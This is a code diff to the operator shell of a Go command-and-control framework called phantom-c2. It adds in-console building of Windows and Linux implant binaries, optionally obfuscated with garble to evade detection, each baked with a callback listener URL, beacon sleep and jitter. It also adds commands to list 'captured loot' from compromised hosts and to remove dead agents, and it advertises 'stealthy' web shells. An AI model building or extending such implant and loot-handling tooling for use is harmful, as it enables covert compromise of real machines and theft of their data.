@@ -10,6 +10,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/phantom-c2/phantom/internal/agent"
 	"github.com/phantom-c2/phantom/internal/db"
 	"github.com/phantom-c2/phantom/internal/payloads"
 	"github.com/phantom-c2/phantom/internal/protocol"
@@ -103,10 +104,14 @@ func (sh *Shell) execute(line string) {
 		sh.cmdListeners(args)
 	case "tasks":
 		sh.cmdTasks(args)
-	case "generate", "payload":
+	case "generate", "payload", "build":
 		sh.cmdGenerate(args)
 	case "events", "log":
 		sh.cmdEvents()
+	case "remove", "rm":
+		sh.cmdRemoveAgent(args)
+	case "loot":
+		sh.cmdLoot(args)
 	case "clear", "cls":
 		fmt.Print("\033[H\033[2J")
 	case "exit", "quit":
@@ -180,7 +185,9 @@ func (sh *Shell) cmdHelp() {
 		{"interact <name|id>", "Interact with an agent"},
 		{"listeners [start|stop] <name>", "Manage listeners"},
 		{"tasks [agent]", "View task history"},
-		{"generate", "Generate agent payloads"},
+		{"generate <type> [url]", "Build agent or generate payload"},
+		{"remove <name|id>", "Remove a dead agent"},
+		{"loot [agent]", "View captured loot"},
 		{"events", "View event log"},
 		{"clear", "Clear screen"},
 		{"help", "Show this help"},
@@ -361,10 +368,11 @@ func (sh *Shell) cmdGenerate(args []string) {
 	fmt.Printf("  %s─────────────────────────────────────────────────────────%s\n", colorDim, colorReset)
 	fmt.Println()
 
-	fmt.Printf("  %sAgent Binaries (cross-compiled):%s\n", colorYellow, colorReset)
-	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe [listener_url]", colorReset, colorDim, "Windows EXE (amd64)", colorReset)
-	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf [listener_url]", colorReset, colorDim, "Linux Binary (amd64)", colorReset)
-	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe-garble [listener_url]", colorReset, colorDim, "Obfuscated Windows EXE", colorReset)
+	fmt.Printf("  %sAgent Binaries (cross-compiled, built from CLI):%s\n", colorYellow, colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe [listener_url]", colorReset, colorDim, "Windows EXE agent (amd64)", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf [listener_url]", colorReset, colorDim, "Linux ELF agent (amd64)", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate exe-garble [listener_url]", colorReset, colorDim, "Obfuscated Windows EXE (garble)", colorReset)
+	fmt.Printf("    %s%-35s%s %s%s%s\n", colorCyan, "generate elf-garble [listener_url]", colorReset, colorDim, "Obfuscated Linux ELF (garble)", colorReset)
 	fmt.Println()
 
 	fmt.Printf("  %sWeb Shells (stealthy, token-protected):%s\n", colorYellow, colorReset)
@@ -385,18 +393,19 @@ func (sh *Shell) cmdGenerate(args []string) {
 		listenerURL = args[1]
 	}
 
-	// Agent binaries
+	// Agent binaries — build directly
 	switch pType {
-	case "exe", "elf", "exe-garble":
-		Info("Use Makefile to build agent binaries:")
-		switch pType {
-		case "exe":
-			fmt.Printf("  %smake agent-windows LISTENER_URL=%s SLEEP=10 JITTER=20%s\n", colorCyan, listenerURL, colorReset)
-		case "elf":
-			fmt.Printf("  %smake agent-linux LISTENER_URL=%s SLEEP=10 JITTER=20%s\n", colorCyan, listenerURL, colorReset)
-		case "exe-garble":
-			fmt.Printf("  %smake agent-garble-windows LISTENER_URL=%s SLEEP=10 JITTER=20%s\n", colorCyan, listenerURL, colorReset)
-		}
+	case "exe":
+		sh.buildAgent("windows", "amd64", listenerURL, false)
+		return
+	case "elf":
+		sh.buildAgent("linux", "amd64", listenerURL, false)
+		return
+	case "exe-garble":
+		sh.buildAgent("windows", "amd64", listenerURL, true)
+		return
+	case "elf-garble":
+		sh.buildAgent("linux", "amd64", listenerURL, true)
 		return
 	}
 
@@ -434,12 +443,106 @@ func (sh *Shell) cmdGenerate(args []string) {
 	}
 }
 
+func (sh *Shell) buildAgent(targetOS, arch, listenerURL string, obfuscate bool) {
+	Info("Building %s/%s agent...", targetOS, arch)
+	if obfuscate {
+		Info("Obfuscation: garble (literals + tiny)")
+	}
+
+	cfg := agent.BuildConfig{
+		OS:          targetOS,
+		Arch:        arch,
+		ListenerURL: listenerURL,
+		Sleep:       sh.server.Config.Server.DefaultSleep,
+		Jitter:      sh.server.Config.Server.DefaultJitter,
+		ServerPub:   sh.server.PubKey,
+		OutputDir:   "build/agents",
+		Obfuscate:   obfuscate,
+	}
+
+	result, err := agent.BuildAgent(cfg)
+	if err != nil {
+		Error("Build failed: %v", err)
+		return
+	}
+
+	Success("Agent built successfully!")
+	fmt.Printf("  %-12s %s\n", "Output:", result.OutputPath)
+	fmt.Printf("  %-12s %s\n", "Size:", agent.FormatSize(result.Size))
+	fmt.Printf("  %-12s %s/%s\n", "Platform:", result.OS, result.Arch)
+	fmt.Printf("  %-12s %s\n", "Listener:", listenerURL)
+	fmt.Printf("  %-12s %ds / %d%%\n", "Sleep:", cfg.Sleep, cfg.Jitter)
+	if obfuscate {
+		fmt.Printf("  %-12s %s\n", "Obfuscation:", "garble (literals stripped)")
+	}
+	fmt.Println()
+}
+
 func hashString(s string) uint64 {
 	h := uint64(0)
 	for _, c := range s {
 		h = h*31 + uint64(c)
 	}
 	return h
+}
+
+func (sh *Shell) cmdRemoveAgent(args []string) {
+	if len(args) == 0 {
+		Error("Usage: remove <agent-name|agent-id>")
+		return
+	}
+
+	a, err := sh.server.AgentMgr.Get(args[0])
+	if err != nil || a == nil {
+		Error("Agent not found: %s", args[0])
+		return
+	}
+
+	Warn("Remove agent '%s' (%s@%s)? This cannot be undone. (y/N): ", a.Name, a.Username, a.Hostname)
+	if sh.scanner.Scan() {
+		if strings.ToLower(strings.TrimSpace(sh.scanner.Text())) == "y" {
+			if err := sh.server.AgentMgr.Remove(a.ID); err != nil {
+				Error("Failed to remove: %v", err)
+				return
+			}
+			Success("Agent '%s' removed", a.Name)
+		}
+	}
+}
+
+func (sh *Shell) cmdLoot(args []string) {
+	agentID := ""
+	if len(args) > 0 {
+		a, err := sh.server.AgentMgr.Get(args[0])
+		if err != nil || a == nil {
+			Error("Agent not found: %s", args[0])
+			return
+		}
+		agentID = a.ID
+	}
+
+	loot, err := sh.server.DB.ListLoot(agentID)
+	if err != nil {
+		Error("Failed to list loot: %v", err)
+		return
+	}
+
+	if len(loot) == 0 {
+		Warn("No loot captured yet")
+		return
+	}
+
+	t := NewTable("ID", "Agent", "Type", "Name", "Created")
+	for _, l := range loot {
+		agentName := util.ShortID(l.AgentID)
+		a, _ := sh.server.AgentMgr.Get(l.AgentID)
+		if a != nil {
+			agentName = a.Name
+		}
+		t.AddRow(util.ShortID(l.ID), agentName, l.Type, l.Name, util.TimeAgo(l.CreatedAt))
+	}
+	fmt.Println()
+	t.Render()
 }
 
 func (sh *Shell) cmdEvents() {
